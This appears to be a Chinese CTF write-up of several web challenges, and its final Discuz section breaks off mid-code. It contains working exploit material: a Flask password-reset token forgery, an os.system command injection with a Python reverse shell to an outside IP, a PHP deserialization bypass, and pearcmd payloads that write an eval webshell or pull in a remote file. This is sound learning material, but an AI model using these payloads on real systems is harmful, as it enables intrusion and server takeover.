sessionSERVER_START_TIME = time.time()# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。# 反正整个程序没有一个地方用到random库。应该没有什么问题。import randomrandom.seed(SERVER_START_TIME) #这里获取一个参数作为种子admin_super_strong_password = token_urlsafe()app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;your-secret-key-here&#x27;app.config[&#x27;SQLALCHEMY_DATABASE_URI&#x27;] = &#x27;sqlite:///site.db&#x27;app.config[&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;] = Falsedb = SQLAlchemy(app)#这个就相当于数据库连接class User(db.Model):    id = db.Column(db.Integer, primary_key=True)    username = db.Column(db.String(20), unique=True, nullable=False)    email = db.Column(db.String(120), unique=True, nullable=False)    password = db.Column(db.String(60), nullable=False)    is_admin = db.Column(db.Boolean, default=False)    time_api = db.Column(db.String(200), default=&#x27;https://api.uuni.cn//api/time&#x27;)#一个用于储存用户数据的类 api默认指向class PasswordResetToken(db.Model):    id = db.Column(db.Integer, primary_key=True)    user_id = db.Column(db.Integer, db.ForeignKey(&#x27;user.id&#x27;), nullable=False)    token = db.Column(db.String(36), unique=True, nullable=False)    used = db.Column(db.Boolean, default=False)def padding(input_string):    byte_string = input_string.encode(&#x27;utf-8&#x27;)#将输入的字节转换为utf-8编码    if len(byte_string) &gt; 6: byte_string = byte_string[:6] #如果长度大于6则只保留前6个    padded_byte_string = byte_string.ljust(6, b&#x27;\\x00&#x27;)    padded_int = int.from_bytes(padded_byte_string, byteorder=&#x27;big&#x27;)     #把6字节作为“大端整数”转换成 int    return padded_intwith app.app_context():    db.create_all()    if not User.query.filter_by(username=&#x27;admin&#x27;).first(): #在User表中查找admin的信息，如果没找到就创建        admin = User(            username=&#x27;admin&#x27;,            email=&#x27;admin@example.com&#x27;,            password=generate_password_hash(admin_super_strong_password),#密码是不可控的            is_admin=True        )        db.session.add(admin)        db.session.commit()def login_required(f): #用于登录的函数    @wraps(f)    def decorated_function(*args, **kwargs):        if &#x27;user_id&#x27; not in session:            flash(&#x27;请登录&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;login&#x27;))        return f(*args, **kwargs)    return decorated_functiondef admin_required(f): #好像是判断用户是否是admin    @wraps(f)    def decorated_function(*args, **kwargs):        if &#x27;user_id&#x27; not in session:            flash(&#x27;请登录&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;login&#x27;))        user = User.query.get(session[&#x27;user_id&#x27;])        if not user.is_admin:            flash(&#x27;你不是admin&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;home&#x27;))        return f(*args, **kwargs)    return decorated_functiondef check_time_api():  #通过user_id获取到time_api但是前面说没写入的时候都是默认    user = User.query.get(session[&#x27;user_id&#x27;])    try:        response = requests.get(user.time_api) #向这个api发送请求        data = response.json()        datetime_str = data.get(&#x27;date&#x27;)        if datetime_str:            print(datetime_str)            current_time = datetime.fromisoformat(datetime_str)            return current_time.year &gt;= 2066   #如果时间大于2066才返回true    except Exception as e: #如果请求失败则返回None        return None    return None@app.route(&#x27;/&#x27;)def home():    return render_template(&#x27;home.html&#x27;)@app.route(&#x27;/server_info&#x27;)@login_required  #将server_info作为参数传递给login_requireddef server_info():    return &#123;        &#x27;server_start_time&#x27;: SERVER_START_TIME,        &#x27;current_time&#x27;: time.time()    &#125; #返回当先的种子@app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) #一个简单的注册路由def register():    if request.method == &#x27;POST&#x27;:        username = request.form.get(&#x27;username&#x27;)        email = request.form.get(&#x27;email&#x27;)        password = request.form.get(&#x27;password&#x27;)        confirm_password = request.form.get(&#x27;confirm_password&#x27;)        if password != confirm_password:            flash(&#x27;密码错误&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;register&#x27;))        existing_user = User.query.filter_by(username=username).first()        if existing_user:            flash(&#x27;已经存在这个用户了&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;register&#x27;))        existing_email = User.query.filter_by(email=email).first()        if existing_email:            flash(&#x27;这个邮箱已经被注册了&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;register&#x27;))        hashed_password = generate_password_hash(password)        new_user = User(username=username, email=email, password=hashed_password)        db.session.add(new_user)        db.session.commit()        flash(&#x27;注册成功，请登录&#x27;, &#x27;success&#x27;)        return redirect(url_for(&#x27;login&#x27;))    return render_template(&#x27;register.html&#x27;)@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) #简单的登录路由def login():    if request.method == &#x27;POST&#x27;:        username = request.form.get(&#x27;username&#x27;)        password = request.form.get(&#x27;password&#x27;)        user = User.query.filter_by(username=username).first()        if user and check_password_hash(user.password, password):            session[&#x27;user_id&#x27;] = user.id            session[&#x27;username&#x27;] = user.username            session[&#x27;is_admin&#x27;] = user.is_admin            flash(&#x27;登陆成功，欢迎!&#x27;, &#x27;success&#x27;)            return redirect(url_for(&#x27;dashboard&#x27;))        else:            flash(&#x27;用户名或密码错误!&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;login&#x27;))    return render_template(&#x27;login.html&#x27;)@app.route(&#x27;/logout&#x27;)@login_requireddef logout():    session.clear()    flash(&#x27;成功登出&#x27;, &#x27;info&#x27;)    return redirect(url_for(&#x27;home&#x27;))@app.route(&#x27;/dashboard&#x27;)@login_requireddef dashboard():    return render_template(&#x27;dashboard.html&#x27;)@app.route(&#x27;/forgot_password&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) #虽然说是通过邮箱验证但实际上不会发验证码def forgot_password():    if request.method == &#x27;POST&#x27;:        email = request.form.get(&#x27;email&#x27;)        user = User.query.filter_by(email=email).first() #获取到邮箱对应的用户        if user:            # 选哪个UUID版本好呢，好头疼 &gt;_&lt;            # UUID v8吧，看起来版本比较新            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧   通过username进行uuid8加密            reset_token = PasswordResetToken(user_id=user.id, token=token)             db.session.add(reset_token)            db.session.commit()            #将获取到的tonke存入数据库            # TODO：写一个SMTP服务把token发出去            flash(f&#x27;密码恢复token已经发送，请检查你的邮箱&#x27;, &#x27;info&#x27;)            return redirect(url_for(&#x27;reset_password&#x27;))        #跳转到下一个路由        else:            flash(&#x27;没有找到该邮箱对应的注册账户&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;forgot_password&#x27;))    return render_template(&#x27;forgot_password.html&#x27;)@app.route(&#x27;/reset_password&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def reset_password():    if request.method == &#x27;POST&#x27;:        token = request.form.get(&#x27;token&#x27;)        new_password = request.form.get(&#x27;new_password&#x27;)        confirm_password = request.form.get(&#x27;confirm_password&#x27;)        #获取我们的表单数据        if new_password != confirm_password:            flash(&#x27;密码不匹配&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;reset_password&#x27;))        reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first()        #从数据库中获取token 并token未被使用 防止token重复使用        if reset_token:            user = User.query.get(reset_token.user_id)            user.password = generate_password_hash(new_password)            reset_token.used = True            db.session.commit()            flash(&#x27;成功重置密码！请重新登录&#x27;, &#x27;success&#x27;)            return redirect(url_for(&#x27;login&#x27;))#校验token修改密码        else:            flash(&#x27;无效或过期的token&#x27;, &#x27;danger&#x27;)            return redirect(url_for(&#x27;reset_password&#x27;))    return render_template(&#x27;reset_password.html&#x27;)@app.route(&#x27;/execute_command&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])@login_requireddef execute_command():    result = check_time_api()    if result is None: #如果访问api失败则返回None        flash(&quot;API死了啦，都你害的啦。&quot;, &quot;danger&quot;)        return redirect(url_for(&#x27;dashboard&#x27;))    if not result: #还需要将api_time大于2066        flash(&#x27;2066年才完工哈，你可以穿越到2066年看看&#x27;, &#x27;danger&#x27;)        return redirect(url_for(&#x27;dashboard&#x27;))    if request.method == &#x27;POST&#x27;:        command = request.form.get(&#x27;command&#x27;) #如果完成上面的条件则可以获取command参数然后执行命令        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。        return redirect(url_for(&#x27;execute_command&#x27;))    return render_template(&#x27;execute_command.html&#x27;)@app.route(&#x27;/admin/settings&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])@admin_requireddef admin_settings():    user = User.query.get(session[&#x27;user_id&#x27;])        if request.method == &#x27;POST&#x27;: #更新api好像没什么要求看来主要是登录admin账号        new_api = request.form.get(&#x27;time_api&#x27;)        user.time_api = new_api        db.session.commit()        flash(&#x27;成功更新API！&#x27;, &#x27;success&#x27;)        return redirect(url_for(&#x27;admin_settings&#x27;))    return render_template(&#x27;admin_settings.html&#x27;, time_api=user.time_api)if __name__ == &#x27;__main__&#x27;:    app.run(debug=False, host=&quot;0.0.0.0&quot;)\n\n终于审计完代码了，看完之后不知道为什么突然感觉这题可以写了，但是好像还是和新生赛有点幽默了。\n漏洞的触发点在于/execute_command路由，使用了system，但是条件是访问我们的api返回的时间必须大于2066，但是只有在/admin/settings路由中可以改变api，所以我们必须登录上admin账号然后修改api为我们的vps然后再返回数据\n现在我们的难点是如何登录上admin账号，我们如果直接爆破admin密码不现实，实际上题解说token_urlsafe也不可控，我们可以看到密码重置功能中有个token，我们直接来看加密代码\ntoken = str(uuid.uuid8(a=padding(user.username)))\n\n通过username通过padding然后通过uuid8进行加密，由于uuid8属于3.14版本的函数，我们先去看下源代码\nPython 3.14.0rc2 (tags/v3.14.0rc2:31967d8, Aug 14 2025, 13:21:13) [MSC v.1944 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import inspect, uuid... print(inspect.getsource(uuid.uuid8))...def uuid8(a=None, b=None, c=None):    &quot;&quot;&quot;Generate a UUID from three custom blocks.    * &#x27;a&#x27; is the first 48-bit chunk of the UUID (octets 0-5);    * &#x27;b&#x27; is the mid 12-bit chunk (octets 6-7);    * &#x27;c&#x27; is the last 62-bit chunk (octets 8-15).    When a value is not specified, a pseudo-random value is generated.    &quot;&quot;&quot;    if a is None:        import random        a = random.getrandbits(48)    if b is None:        import random        b = random.getrandbits(12)  #生成一个长度为12的随机数    if c is None:        import random        c = random.getrandbits(62)    int_uuid_8 = (a &amp; 0xffff_ffff_ffff) &lt;&lt; 80    int_uuid_8 |= (b &amp; 0xfff) &lt;&lt; 64    int_uuid_8 |= c &amp; 0x3fff_ffff_ffff_ffff    # by construction, the variant and version bits are already cleared    int_uuid_8 |= _RFC_4122_VERSION_8_FLAGS    return UUID._from_int(int_uuid_8)\n\n我们可以看到uuid8的源代码中使用到了random库，然后在后面也使用到random库去生成随机数，于是我们在知道random种子的情况下可以复现uuid8的随机数\n我们先来看下种子\nSERVER_START_TIME = time.time()# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。# 反正整个程序没有一个地方用到random库。应该没有什么问题。import randomrandom.seed(SERVER_START_TIME) #这里获取一个参数作为种子\n\ntime.time获取的是服务器启动到现在时间的一个时间戳，但是SERVER_START_TIME则是在服务器开始运行的时间戳也就是不会改变的，在/server_info路由中会显示\n@app.route(&#x27;/server_info&#x27;)@login_required  #将server_info作为参数传递给login_requireddef server_info():    return &#123;        &#x27;server_start_time&#x27;: SERVER_START_TIME,        &#x27;current_time&#x27;: time.time()    &#125; #返回当前的种子\n\n我们在注册好账号后即可访问server_info路由获取种子\n\n\n有了种子之后我们直接进行加密获取token\nSERVER_START_TIME =1756876850.2542005import randomimport uuidrandom.seed(SERVER_START_TIME) #这里获取一个参数作为种子def padding(input_string):    byte_string = input_string.encode(&#x27;utf-8&#x27;)    if len(byte_string) &gt; 6: byte_string = byte_string[:6]    padded_byte_string = byte_string.ljust(6, b&#x27;\\x00&#x27;)    padded_int = int.from_bytes(padded_byte_string, byteorder=&#x27;big&#x27;)    return padded_inttoken = str(uuid.uuid8(a=padding(&#x27;admin&#x27;)))print(token)\n\n成功拿到token\n\n\n于是我们使用这个token和代码中给的admin邮箱去重置密码\n61646d69-6e00-865d-a6f9-c0def4e390d6admin@example.com\n\n重置密码\n\n\n重置之后成功登录admin账号然后即可访问/admin/settings路由改我们的time_api，我们再来看下命令执行路由\n@app.route(&#x27;/execute_command&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])@login_requireddef execute_command():    result = check_time_api()    if result is None: #如果访问api失败则返回None        flash(&quot;API死了啦，都你害的啦。&quot;, &quot;danger&quot;)        return redirect(url_for(&#x27;dashboard&#x27;))    if not result: #还需要将api_time大于2066        flash(&#x27;2066年才完工哈，你可以穿越到2066年看看&#x27;, &#x27;danger&#x27;)        return redirect(url_for(&#x27;dashboard&#x27;))    if request.method == &#x27;POST&#x27;:        command = request.form.get(&#x27;command&#x27;) #如果完成上面的条件则可以获取command参数然后执行命令        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。        return redirect(url_for(&#x27;execute_command&#x27;))    return render_template(&#x27;execute_command.html&#x27;)\n\n顺便再去看下默认api返回什么\n\n\n返回的是一些json数据，我使用vps返回date数据应该可以大于2066\n我懒得自己写脚本了，就从出题人的wp中拿了过来\nfrom http.server import BaseHTTPRequestHandler, HTTPServerimport jsonclass JSONRequestHandler(BaseHTTPRequestHandler):    def do_GET(self):        if self.path == &quot;/&quot;:            data = &#123;&quot;date&quot;: &quot;2099-07-05 00:00:00&quot;&#125;        self.send_response(200)        self.send_header(&quot;Content-Type&quot;, &quot;application/json&quot;)        self.end_headers()        self.wfile.write(json.dumps(data).encode(&quot;utf-8&quot;))def run(server_class=HTTPServer, handler_class=JSONRequestHandler, port=5051):    server_address = (&quot;0.0.0.0&quot;, port)    httpd = server_class(server_address, handler_class)    httpd.serve_forever()if __name__ == &quot;__main__&quot;:    run()\n\n开启python服务改了api后访问命令执行路由\n\n\n我们可以进行命令执行，由于这个不会回显我们只能选择反弹shell，还是拿出题人反弹shell的代码\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.94.223.220&quot;,7002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;\n\n成功拿到shell执行命令拿到flag\n\n\n\n\n\n\n3.Your Uns3r直接给代码了\n &lt;?phphighlight_file(__FILE__);class User&#123;    public $username;    public $value;    public function exec()    &#123;        if (strpos($this-&gt;value, &#x27;S:&#x27;) === false) &#123;            $ser = serialize(unserialize($this-&gt;value));            $instance = unserialize($ser);            if ($ser != $this-&gt;value &amp;&amp; $instance instanceof Access) &#123;                include($instance-&gt;getToken());            &#125;        &#125; else &#123;            throw new Exception(&quot;wanna ?&quot;);        &#125;    &#125;    public function __destruct()    &#123;        if ($this-&gt;username == &quot;admin&quot;) &#123;            $this-&gt;exec();        &#125;    &#125;&#125;class Access&#123;    protected $prefix;    protected $suffix;    public function getToken()    &#123;        if (!is_string($this-&gt;prefix) || !is_string($this-&gt;suffix)) &#123;            throw new Exception(&quot;Go to HELL!&quot;);        &#125;        $result = $this-&gt;prefix . &#x27;lilctf&#x27; . $this-&gt;suffix;        if (strpos($result, &#x27;pearcmd&#x27;) !== false) &#123;            throw new Exception(&quot;Can I have peachcmd?&quot;);        &#125;        return $result;    &#125;&#125;$ser = $_POST[&quot;user&quot;];if (stripos($ser, &#x27;admin&#x27;) !== false || stripos($ser, &#x27;Access&quot;:&#x27;) !== false) &#123;    exit (&quot;no way!!!!&quot;);&#125;$user = unserialize($ser);throw new Exception(&quot;nonono!!!&quot;); \n\n这个题目反正我是一开始不会写的，太菜了，具体流程大概就是绕过waf，打通pop链然后通过某种神秘的文件包含写入shell，但是这不是重点，有好多用到的知识点我都没见过，我还需要知道一些前置知识\n我们先来看一些代码\n$ser = serialize(unserialize($this-&gt;value));$instance = unserialize($ser);if ($ser != $this-&gt;value &amp;&amp; $instance instanceof Access) &#123;    include($instance-&gt;getToken());&#125;\n\n经过反序列化然后序列化，然后需要不等于原来的字符串，在之前是没法实现的但是php反序列化中有一个特性就是__PHP_Incomplete_Class\n在 PHP 中，当你尝试将序列化文本进行反序列化操作以获得一个 对象 时，若 与序列化文本相关联的类还没有在当前 PHP 上下文中被定义或包含时，PHP 就会使用 __PHP_Incomplete_Class 对象来代替\n&lt;?php$result = unserialize(&#x27;O:7:&quot;MyClass&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;);var_dump($result);object(__PHP_Incomplete_Class)#1 (3) &#123;  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;  string(7) &quot;MyClass&quot;  [&quot;name&quot;]=&gt;  string(8) &quot;RedHeart&quot;  [&quot;nation&quot;]=&gt;  string(5) &quot;China&quot;&#125;\n\n然后我们的反序列化结果就变成了__PHP_Incomplete_Class对象，然后我们原来的类名变为了__PHP_Incomplete_Class_Name这个属性\n然后很明显经过反序列化之后发生了变化，我们在将这个数据进行序列化试下发现又变成了原来的数据\n&lt;?php$serialize_text = &#x27;O:7:&quot;MyClass&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;;var_dump(serialize(unserialize($serialize_text)) === $serialize_text);bool(true)\n\n但是我们还可以进行伪造操作，就是人为的去伪造__PHP_Incomplete_Class为类名的序列化数据\n&lt;?phpvar_dump(unserialize(&#x27;O:22:&quot;__PHP_InComplete_Class&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;));object(__PHP_Incomplete_Class)#2 (2) &#123;  [&quot;name&quot;]=&gt;  string(8) &quot;RedHeart&quot;  [&quot;nation&quot;]=&gt;  string(5) &quot;China&quot;&#125;\n\n发现结果就是和上面的数据比少了一个__PHP_Incomplete_Class_Name属性\n现在就又有问题了，将__PHP_InComplete_Class类进行序列化的时候会寻找之前不存在的类名作为序列化数据，但是如果我们拿着这个没有__PHP_Incomplete_Class_Name属性的去进行序列化结果会是什么\n&lt;?phpvar_dump(serialize(unserialize(&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;)));string(85) &quot;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&quot;\n\n发现类名还是__PHP_InComplete_Class，但是我们的属性就自动减少了一个由2变为了1，也就是说serialize在发现类名是__PHP_Incomplete_Class的时候不会在乎是否有__PHP_Incomplete_Class_Name这个属性，会自动的将属性描述值减一，于是就会出现\n&lt;?php$b=&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;;$a=serialize(unserialize($b));var_dump($a===$b);bool(false)\n\n\n\n我们在知道如何绕过\n$ser = serialize(unserialize($this-&gt;value));$instance = unserialize($ser);if ($ser != $this-&gt;value &amp;&amp; $instance instanceof Access) &#123;    include($instance-&gt;getToken());&#125;\n\n也还不行，我们还需要让其反序列化结果为Access类\n从题解中学过来的绕过方法就是，我们提前在我们的序列化数据中添加__PHP_Incomplete_Class_Name为Access\n&lt;?php$a = &#x27;O:7:&quot;MyClass&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:6:&quot;Access&quot;;&#125;&#x27;;var_dump(serialize(unserialize($a)));string(68) &quot;O:6:&quot;Access&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&quot;\n\n也就是说没有覆盖掉我们的添加的属性反而我们伪造的属性成功赋值了\n但是我们需要提前将属性数目加一\n剩下的就是看代码\npublic function getToken()&#123;    if (!is_string($this-&gt;prefix) || !is_string($this-&gt;suffix)) &#123;        throw new Exception(&quot;Go to HELL!&quot;);    &#125;    $result = $this-&gt;prefix . &#x27;lilctf&#x27; . $this-&gt;suffix;    if (strpos($result, &#x27;pearcmd&#x27;) !== false) &#123;        throw new Exception(&quot;Can I have peachcmd?&quot;);    &#125;    return $result;&#125;\n\n后面会对rusult进行文件包含，一开始看题解说题目出错了，在后面应该拼接.php，导致我以为可以通过php伪协议去实现，但是include后面少了输出语句导致php伪协议不行\n看了题解才知道后面添加.php和过滤掉pearcmd可能是提示我们去使用peclcmd.php\npeclcmd.php和pearcmd.php都是是PHP中用于管理扩展而使用的命令行工具，在这个题目中没有什么区别。\n利用这个漏洞需要php开启register_argc_argv选项以及确定pearcmd.php的位置，正常pearcmd.php的位置是在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php里面\n接下来分析以下$_SERVER[‘argv’]的作用\nDocker环境下的PHP会开启register_argc_argv这个配置。当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[&#x27;argv&#x27;]几个变量。\n\n当我们开启register_argc_argv选项的时候，$_SERVER[‘argv’]就会生效。peracmd.php获取参数的代码：public static function readPHPArgv()&#123;    global $argv;    if (!is_array($argv)) &#123;        if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;            if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;                $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;                return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);            &#125;            return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];        &#125;        return $_SERVER[&#x27;argv&#x27;];    &#125;    return $argv;&#125;也就是说在argv的情况下，pearcmd.php是通过$_SERVER[‘argv’]来获取参数数\n\n也就是我们传入的值都会作为参数\n\n\n而且在这里面不是通过&amp;来分发参数的\n1.&amp;符无发分割参数，真正能分割参数的是加号2.等号无法赋值，而是会直接被传进去当作参数。\n\n而pear命令实质上就是调用了pearcmd.php，也就是说我们可以利用pear命令的形式来进行漏洞利用。\npear命令：\n\n\n可以利用这个命令\n（1）config-create这个方法有两个参数，第一个参数会作为文件内容写入第二参数的文件利用payload：?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php//在shell前面添加/的原因是为了让其作为字符串而不是在命令行中被解析为路径//还需要注意的是被GET传参解析了的参数无法作为arge参数的分析：$_SERVER[‘argv’]会获取传入的值作为参数通过调用pear命令config-create写入两个参数，从而写入一个shell文件从而进行getshell\n\n命令行中执行的命令就是\nconfig-create  &lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt; /tmp/test.php\n\n除了上面的方法还有\n2）Install除了上面的方法我们还可以使用install方法，从外面将shell文件下载进来然后进行getshell。payload如下?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php从上面的分析中，我们不难看出这串payload所下载的文件的保存地址在&amp;file=/usr/local/lib/php/pearcmd.php\\&amp;/tmp/pear/download/路径下面，这里我在使用的时候会遇到一些有关配置方面的问题，因为名为&amp;file=/usr/local/lib/php/pearcmd.php\\&amp;的文件夹是新创建的，而我并没有权限对其进行写操作而导致利用失败。\n\n\n\n\n\n在知道peclcmd.php的使用方法后，我们可以先包含/user/local/lib/php/pearcmd.php，然后通过config-create去将shell写入index.php中\n但是还剩下最后一个问题，就是\n$user = unserialize($ser);throw new Exception(&quot;nonono!!!&quot;); \n\n这个代码会导致在程序结束前抛出错误导致，题解中给出的解决办法就是我们可以删除序列化数据的最后一个花括号然后利用 fast destruct (GC回收)，触发__desturct\n也就是反序列化到最后要结束了发现数据的格式是错误的但是对象已经实例化完毕然后开始销毁对象然后触发__destruct\n&lt;?phpclass User&#123;    public $username=0;    public $value;    public function exec()    &#123;        if (strpos($this-&gt;value, &#x27;S:&#x27;) === false) &#123;            $ser = serialize(unserialize($this-&gt;value));            //echo $ser;            $instance = unserialize($ser);            if ($ser != $this-&gt;value &amp;&amp; $instance instanceof Access) &#123;                //echo &#x27;2&#x27;;                //include($instance-&gt;getToken());            &#125;        &#125; else &#123;            throw new Exception(&quot;wanna ?&quot;);        &#125;    &#125;    public function __destruct()    &#123;        if ($this-&gt;username == &quot;admin&quot;) &#123;            //echo &#x27;1&#x27;;            $this-&gt;exec();        &#125;    &#125;&#125;class Access&#123;    protected $prefix=&#x27;/usr/local/lib/&#x27;;    protected $suffix=&#x27;/../php/peclcmd.php&#x27;;    public function getToken()    &#123;        if (!is_string($this-&gt;prefix) || !is_string($this-&gt;suffix)) &#123;            throw new Exception(&quot;Go to HELL!&quot;);        &#125;        $result = $this-&gt;prefix . &#x27;lilctf&#x27; . $this-&gt;suffix;        if (strpos($result, &#x27;pearcmd&#x27;) !== false) &#123;            throw new Exception(&quot;Can I have peachcmd?&quot;);        &#125;        return $result;    &#125;&#125;$a=new Access();$b=new User();$d=serialize($a);//echo $d;$c=str_replace(&#x27;Access&quot;:2&#x27;,&#x27;LilRan&quot;:3&#x27;,$d);$c=substr($c,0,-1);//echo $c;$c=$c.&#x27;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:6:&quot;Access&quot;;&#125;&#x27;;$b-&gt;value=$c;$ser =urlencode(serialize($b));$ser=substr($ser,0,-1);echo $ser;//\n\n最后进行命令执行\nPOST /index.php?+config-create+/&lt;?=eval($_POST[0])?&gt;+/var/www/html/index.php HTTP/1.1user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bi%3A0%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&amp;0=system(&#x27;/readflag&#x27;);\n\n连续发送两次，第一次写入shell，第二次执行命令\n这个题目还有一个就是在校验admin的时候本来应该是强制比较\n        if ($this-&gt;username === &quot;admin&quot;) &#123;            $this-&gt;exec();        &#125;//后面又进行了一次$ser = $_POST[&quot;user&quot;];if (stripos($ser, &#x27;admin&#x27;) !== false || stripos($ser, &#x27;Access&quot;:&#x27;) !== false) &#123;    exit (&quot;no way!!!!&quot;);&#125;\n\n题解的绕过方法就是，在序列化数据中s:表示字符串，S:则表示特殊字符串会进行进制解析\n$user-&gt;username = &#x27;admin&#x27;;$user-&gt;value = $ser;$userser = serialize($user);$userser = str_replace(&#x27;;s:5:&quot;admin&quot;&#x27;, &#x27;;S:5:&quot;\\61dmin&quot;&#x27;, $userser);\n\n解决方法就是进行一个替换，但是这样我就不知道过滤S:的意义是什么，又没有过滤到\n4.我曾有一份工作进入靶场是一个discuz论坛，这个论坛好像在很多老网站上面看到过，然后可以直接通过www.zip下载源码，问了下GPT发现这个对于URL解析和普通PHP代码差不多，终于不用重新审框架了，直接去看具体代码即可\n题解说漏洞在/api/db/dbbak.php中，dbbak指的是数据库备份，那dbbak.php应该就是专门处理这个的代码，其中包含多个操作指令，我们需要用到的是export，用于导出sql文件\n重点不在于我们如何去触发，dbbak.php中的export指令会直接返回xml文件中有sql文件的路径，主要是需要伪造code触发这个指令，换句话说，code 就是一个加密了的 GET 参数集合，里面必须有 method=export。\n\n\n我们需要去看看code的加密方法\nparse_str(_authcode($code, &#x27;DECODE&#x27;, UC_KEY), $get);\n\n这个是对code参数进行一个解密然后获得一个get数组\n我们直接去看_authcode函数\nfunction _authcode($string, $operation = &#x27;DECODE&#x27;, $key = &#x27;&#x27;, $expiry = 0) &#123;\t$ckey_length = 4;\t$key = md5($key ? $key : UC_KEY);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == &#x27;DECODE&#x27; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == &#x27;DECODE&#x27; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);//这里添加了时间戳，实际上我们加密的时候也需要加上时间戳\t$result = &#x27;&#x27;;\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i &lt;= 255; $i++) &#123;\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t&#125;\tfor($j = $i = 0; $i &lt; 256; $i++) &#123;\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t&#125;\tfor($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= 